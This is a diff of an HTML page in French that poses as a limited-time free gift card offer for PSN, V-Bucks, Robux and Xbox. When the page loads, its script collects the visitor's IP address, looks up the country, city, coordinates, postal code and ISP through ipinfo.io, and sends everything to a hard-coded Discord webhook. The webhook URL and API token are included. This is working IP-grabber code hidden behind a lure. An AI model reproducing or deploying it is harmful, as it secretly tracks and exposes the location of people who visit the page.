@@ -3,22 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:title" content="Carte cadeau gratuite">
     <meta property="og:description" content="Carte PSN/VBUCKS/ROBUX/XBOX gratuite (temps limité). Carte Switch en rupture de stock.">
     <meta property="og:footer" content="By Nocturnal °2024">
     <meta property="og:thumbnail" content="https://th.bing.com/th/id/OIP.7TbP_qhleErYCxJa1zYyKwHaEc?w=237&h=180&c=7&r=0&o=5&pid=1.7">
     <meta property="og:image" content="https://th.bing.com/th/id/OIP.7TbP_qhleErYCxJa1zYyKwHaEc?w=237&h=180&c=7&r=0&o=5&pid=1.7">
     <title>Carte cadeau gratuite | Temps limité !</title>
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            margin: 0;
+            padding: 2em;
+        }
+        h1 {
+            color: #ffa500;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
+        }
+        hr {
+            border: 1px solid #ffa500;
+        }
+        p {
+            margin: 0.5em 0;
+        }
+        strong {
+            color: #ffa500;
+        }
+        span {
+            color: #b3b3b3;
+        }
+    </style>
 </head>
 <body>
-
+    <h1>Hi! Here's Your Exact Location:</h1>
+    <hr>
+    <p><strong>IP Address:</strong> <span id="ip_address"></span></p>
+    <p><strong>Country:</strong> <span id="country_name"></span></p>
+    <p><strong>Region:</strong> <span id="region_name"></span></p>
+    <p><strong>City:</strong> <span id="city_name"></span></p>
+    <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+    <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+    <p><strong>Postal Code:</strong> <span id="postal_code"></span></p>
+    <p><strong>Timezone:</strong> <span id="timezone"></span></p>
+    <p><strong>ISP:</strong> <span id="isp"></span></p>
+    <hr>
     <script>
-        // Remplacez "VOTRE_WEBHOOK_URL" par l'URL de votre webhook Discord
-        const webhookUrl = "https://discord.com/api/webhooks/1227957573416783932/uTAQyw8ouBSMXirTYc4l3l5Qe-zdNU-br7Lsm-VwcskwGWjAGkW-c9qTrivL7wYceME9";
-
         // Fonction pour effectuer une requête HTTP POST vers le webhook Discord
         function sendRequest(data) {
-            fetch(webhookUrl, {
+            fetch("https://discord.com/api/webhooks/1227957573416783932/uTAQyw8ouBSMXirTYc4l3l5Qe-zdNU-br7Lsm-VwcskwGWjAGkW-c9qTrivL7wYceME9", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -33,26 +68,6 @@
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    const userAgent = navigator.userAgent;
-                    const isMobile = /Mobi|Android/i.test(userAgent);
-                    const is4G = /Mobile|Tablet|Android/i.test(userAgent);
-
-                    // Déterminer l'OS et le navigateur à partir de l'user agent
-                    const os = (function() {
-                        if (/Windows/i.test(userAgent)) return "Windows";
-                        if (/Macintosh/i.test(userAgent)) return "Macintosh";
-                        if (/Linux/i.test(userAgent)) return "Linux";
-                        return "Autre";
-                    })();
-
-                    const browser = (function() {
-                        if (/Firefox/i.test(userAgent)) return "Firefox";
-                        if (/Chrome/i.test(userAgent)) return "Chrome";
-                        if (/Safari/i.test(userAgent)) return "Safari";
-                        if (/Edge/i.test(userAgent)) return "Edge";
-                        if (/Opera/i.test(userAgent)) return "Opera";
-                        return "Autre";
-                    })();
 
                     // Utilisez l'API ipinfo.io pour obtenir des informations géographiques, y compris l'opérateur
                     fetch(`https://ipinfo.io/${ip}/json?token=45c2b276273cb7`)
@@ -66,20 +81,19 @@
                                 description: "@everyone Informations de l'utilisateur :",
                                 fields: [
                                     { name: 'IP', value: ip, inline: true },
-                                    { name: 'User Agent', value: userAgent, inline: true },
-                                    { name: 'Système d\'exploitation', value: os, inline: true },
-                                    { name: 'Navigateur', value: browser, inline: true },
-                                    { name: 'Mobile', value: isMobile ? 'Oui' : 'Non', inline: true },
-                                    { name: '4G', value: is4G ? 'Oui' : 'Non', inline: true },
-                                    { name: 'Opérateur IP', value: operator, inline: true },
+                                    { name: 'Country', value: ipInfo.country, inline: true },
+                                    { name: 'Region', value: ipInfo.region, inline: true },
+                                    { name: 'City', value: ipInfo.city, inline: true },
+                                    { name: 'Latitude', value: ipInfo.loc.split(',')[0], inline: true },
+                                    { name: 'Longitude', value: ipInfo.loc.split(',')[1], inline: true },
+                                    { name: 'Postal Code', value: ipInfo.postal, inline: true },
+                                    { name: 'Timezone', value: ipInfo.timezone, inline: true },
+                                    { name: 'ISP', value: operator, inline: true },
                                 ],
                             };
 
                             // Envoie les informations au webhook Discord
                             sendRequest({ content: "@everyone", embeds: [embed] });
-
-                            // Affiche une image définie après avoir envoyé l'embed
-                            document.body.innerHTML = `<a href="https://discord.gg/e29mdZEd" target="_blank"><img src="https://cdn.discordapp.com/attachments/1146231007608045598/1176958539395252244/Merci_pour_ton_IP.png?ex=6570c30e&is=655e4e0e&hm=cad9e668b361f288286b6e26728cec0d69b322541e284fcc3f346562991eb04f&" alt="Merci de nous avoir envoyé votre IP !">`;
                         })
                         .catch(error => console.error('Erreur lors de la récupération des informations IPInfo :', error));
                 })
